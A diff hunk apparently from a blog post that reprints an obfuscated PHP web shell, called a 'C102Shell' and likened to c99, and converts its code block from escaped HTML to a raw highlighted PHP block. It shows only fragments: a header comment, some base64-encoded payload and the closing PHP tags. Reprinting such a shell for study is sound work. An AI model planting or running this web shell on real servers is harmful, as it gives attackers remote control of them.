@@ -17,7 +17,7 @@ This is supposedly a c102 shell, but it just looks like a c99 script to me..
 
 ### C102Shell (encrypted) Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php 
+{% highlight php %}<?php 
 /*
 #################################################################################################
 #                        EGY-MaF!4                              #
@@ -3005,8 +3005,8 @@ b29nbGUuY29tIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+QS5BLlQ8L2ZvbnQ+PC9hPjxmb250IGNv
 bG9yPSIjRkYwMDAwIj48L2ZvbnQ+IHwgR2VuZXJhdGlvbiB0aW1lOiA8P3BocCBlY2hvIHJvdW5k
 KGdldG1pY3JvdGltZSgpLXN0YXJ0dGltZSw0KTsgPz4gXS0tPC9iPjwvcD48L3RkPjwvdHI+PC90
 YWJsZT4gDQo8L2JvZHk+PC9odG1sPjw/cGhwIGNoZGlyKCRsYXN0ZGlyKTsgYzk5c2hleGl0KCk7
-ICANCg=='));?&gt; 
-?&gt;&lt;?
+ICANCg=='));?> 
+?><?
 // EnD of Coding
-?&gt;
-</pre>
+?>
+{% endhighlight %}
